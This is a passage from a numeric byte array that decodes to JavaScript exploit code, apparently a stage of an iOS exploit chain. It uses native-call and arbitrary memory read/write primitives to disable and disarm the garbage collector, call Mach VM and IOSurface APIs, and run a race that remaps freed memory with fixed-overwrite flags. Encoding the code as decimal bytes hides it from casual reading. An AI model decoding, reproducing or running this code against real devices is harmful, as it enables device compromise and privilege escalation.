65, 76, 85, 69, 44, 32, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 40, 100, 105, 99, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 44, 32, 100, 105, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 124, 32, 40, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 60, 60, 32, 51, 50, 110, 41, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 109, 97, 112, 40, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 77, 65, 80, 44, 32, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 117, 110, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 85, 78, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 61, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 101, 110, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 47, 42, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 80, 114, 111, 98, 108, 101, 109, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 71, 67, 32, 105, 115, 32, 116, 114, 105, 103, 103, 101, 114, 105, 110, 103, 44, 32, 97, 110, 100, 32, 105, 116, 32, 99, 97, 108, 108, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 45, 62, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 46, 103, 101, 116, 82, 101, 103, 105, 115, 116, 101, 114, 115, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 105, 115, 32, 98, 97, 110, 110, 101, 100, 32, 98, 121, 32, 97, 117, 116, 111, 98, 111, 120, 32, 105, 110, 32, 62, 61, 49, 56, 46, 52, 32, 119, 104, 105, 99, 104, 32, 108, 101, 97, 100, 115, 32, 116, 111, 32, 99, 114, 97, 115, 104, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 83, 111, 108, 117, 116, 105, 111, 110, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 111, 32, 119, 111, 114, 107, 32, 99, 111, 114, 114, 101, 99, 116, 108, 121, 32, 105, 110, 32, 110, 111, 106, 105, 116, 32, 101, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 32, 71, 67, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 115, 99, 97, 110, 32, 97, 116, 32, 108, 101, 97, 115, 116, 32, 116, 104, 101, 32, 115, 116, 97, 99, 107, 32, 111, 102, 32, 99, 117, 114, 114, 101, 110, 116, 32, 116, 104, 114, 101, 97, 100, 32, 119, 105, 116, 104, 32, 99, 97, 108, 108, 32, 116, 111, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 100, 111, 101, 115, 110, 39, 116, 32, 105, 110, 118, 111, 108, 118, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 115, 111, 32, 105, 116, 39, 115, 32, 115, 97, 102, 101, 32, 116, 111, 32, 100, 111, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 118, 111, 105, 100, 32, 77, 97, 99, 104, 105, 110, 101, 84, 104, 114, 101, 97, 100, 115, 58, 58, 103, 97, 116, 104, 101, 114, 67, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 40, 46, 46, 46, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 40, 99, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 44, 32, 106, 105, 116, 83, 116, 117, 98, 82, 111, 117, 116, 105, 110, 101, 115, 44, 32, 99, 111, 100, 101, 66, 108, 111, 99, 107, 115, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 46, 46, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 33, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 40, 108, 111, 99, 107, 101, 114, 44, 32, 98, 117, 102, 102, 101, 114, 44, 32, 99, 97, 112, 97, 99, 105, 116, 121, 44, 32, 38, 115, 105, 122, 101, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 41, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 114, 111, 119, 66, 117, 102, 102, 101, 114, 40, 115, 105, 122, 101, 44, 32, 38, 98, 117, 102, 102, 101, 114, 44, 32, 38, 99, 97, 112, 97, 99, 105, 116, 121, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 79, 110, 32, 116, 104, 101, 32, 111, 116, 104, 101, 114, 32, 104, 97, 110, 100, 44, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 119, 105, 108, 108, 32, 116, 114, 121, 32, 116, 111, 32, 105, 116, 101, 114, 97, 116, 101, 32, 116, 104, 114, 101, 97, 100, 115, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 97, 110, 100, 32, 99, 97, 108, 108, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 87, 101, 32, 99, 97, 110, 32, 97, 118, 111, 105, 100, 32, 105, 116, 32, 98, 121, 32, 110, 117, 108, 108, 105, 110, 103, 32, 102, 105, 114, 115, 116, 32, 109, 101, 109, 98, 101, 114, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 46, 116, 104, 114, 101, 97, 100, 115, 32, 119, 104, 105, 99, 104, 32, 112, 114, 101, 118, 101, 110, 116, 115, 32, 105, 116, 101, 114, 97, 116, 105, 111, 110, 32, 97, 110, 100, 32, 115, 116, 105, 108, 108, 32, 109, 97, 107, 101, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 114, 101, 116, 117, 114, 110, 32, 116, 114, 117, 101, 46, 10, 32, 32, 32, 32, 10, 32, 32, 32, 32, 42, 47, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 104, 101, 97, 112, 32, 43, 32, 48, 120, 49, 57, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 116, 104, 114, 101, 97, 100, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 116, 104, 114, 101, 97, 100, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 48, 120, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 114, 109, 101, 100, 34, 41, 59, 10, 125, 10, 10, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 59, 10, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 72, 101, 108, 108, 111, 32, 102, 114, 111, 109, 58, 32, 34, 32, 43, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 46, 104, 101, 120, 40, 41, 41, 59, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 58, 32, 34, 32, 43, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 46, 104, 101, 120, 40, 41, 41, 59, 10, 10, 108, 101, 116, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 61, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 56, 110, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 48, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 56, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 48, 110, 59, 10, 108, 101, 116, 32, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 108, 101, 116, 32, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 51, 48, 110, 59, 10, 10, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 32, 123, 10, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 117, 114, 101, 97, 100, 54, 52, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 65, 108, 108, 111, 99, 97, 116, 101, 32, 97, 32, 110, 101, 119, 32, 110, 111, 110, 45, 99, 111, 110, 116, 105, 103, 117, 111, 117, 115, 32, 109, 97, 112, 32, 101, 110, 116, 114, 121, 32, 40, 111, 112, 116, 105, 111, 110, 97, 108, 108, 121, 32, 117, 115, 105, 110, 103, 32, 97, 32, 109, 101, 109, 111, 114, 121, 32, 111, 98, 106, 101, 99, 116, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 107, 114, 32, 61, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 124, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 107, 114, 32, 33, 61, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 41, 32, 123, 10, 32, 